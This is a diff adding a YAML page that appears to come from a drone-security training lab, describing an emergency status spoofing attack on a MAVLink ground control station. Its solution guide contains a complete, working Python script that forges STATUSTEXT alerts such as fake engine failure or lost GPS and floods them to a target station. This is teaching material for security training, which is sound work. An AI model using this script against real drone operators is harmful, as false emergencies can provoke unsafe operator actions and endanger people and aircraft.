@@ -1,0 +1,107 @@
+title: Emergency Status Spoofing
+order: 5
+description: Spoofing emergency status messages to mislead the Ground Control Station (GCS) about the drone's condition.
+breadcrumb:
+  - text: Attack Scenarios
+    link: /attacks
+  - text: Reconnaissance
+  - text: Emergency Status Spoofing
+
+sections:
+  - title: Description
+    content: |
+      Emergency status spoofing involves sending false emergency messages to the Ground 
+      Control Station (GCS) to mislead it about the drone's condition. This can cause 
+      the operator to believe that the drone is experiencing critical issues, potentially 
+      leading to inappropriate responses or actions.
+
+  - title: Resources
+    content:
+      - text: MAVLink Protocol
+        link: https://mavlink.io/en/
+      - text: PyMAVLink Documentation
+        link: https://www.ardusub.com/developers/pymavlink.html
+
+  - title: Solution Guide
+    collapsible: true
+    steps:
+      - title: Step 1. Setup
+        description: |
+          Ensure you have Python and the necessary libraries installed:
+          ```sudo apt-get update
+          sudo apt-get install python3 python3-pip
+          pip3 install pymavlink scapy
+          ```
+
+      - title: Step 2. Create the Script
+        description: |
+          Create a Python script named `emergency-status-spoofing.py` and paste the following code:
+          ```from pymavlink import mavutil
+          from scapy.all import *
+          import time
+          import sys
+          import random
+
+          def create_statustext(severity, text):
+              """
+              Create a MAVLink STATUSTEXT message.
+              """
+              mav = mavutil.mavlink.MAVLink(None)
+              mav.srcSystem = 1
+              mav.srcComponent = 1
+
+              statustext = mav.statustext_encode(
+                  severity=severity,  # Severity of status message
+                  text=text.encode('utf-8')  # Status text message
+              )
+
+              return statustext.pack(mav)
+
+          def send_mavlink_packet(packet_data, target_ip, target_port):
+              """
+              Send a MAVLink packet using Scapy.
+              """
+              packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
+              send(packet)
+
+          if __name__ == "__main__":
+              if len(sys.argv) != 2:
+                  print("Usage: python emergency-status-spoofing.py <ip:port>")
+                  sys.exit(1)
+
+              target = sys.argv[1]
+              target_ip, target_port = target.split(':')
+              target_port = int(target_port)
+
+              messages = [
+                  (0, "EMERGENCY: Immediate action required"),
+                  (1, "ALERT: Attention needed"),
+                  (2, "CRITICAL: Engine failure"),
+                  (3, "ERROR: GPS signal lost"),
+                  (4, "WARNING: High temperature detected"),
+                  (5, "NOTICE: System check complete"),
+                  (6, "INFO: Battery at 50%"),
+                  (7, "DEBUG: Diagnostic mode enabled")
+              ]
+
+              while True:
+                  severity, message = random.choice(messages)
+                  statustext_packet = create_statustext(severity, message)
+
+                  send_mavlink_packet(statustext_packet, target_ip, target_port)
+                  
+                  print(f"Sent STATUSTEXT packet with severity {severity} and message '{message}' to {target_ip}:{target_port}")
+                  
+                  time.sleep(1)
+          ```
+
+      - title: Step 3. Run the Script
+        description: |
+          Execute the script with sudo and the target GCS IP and port:
+          ```sudo python emergency-status-spoofing.py <ip:port>
+          ```
+          Replace `<ip:port>` with the actual IP address and port of the QGroundControl App using `10.13.0.6:14550` or the GCS (MAVProxy) using `192.168.13.14:14550`/`10.13.0.4:14550`
+
+      - title: Step 4. Monitor the Effects
+        description: |
+          Observe the GCS to see the spoofed emergency status messages being displayed. The drone's condition will appear to have critical issues, misleading the operator.
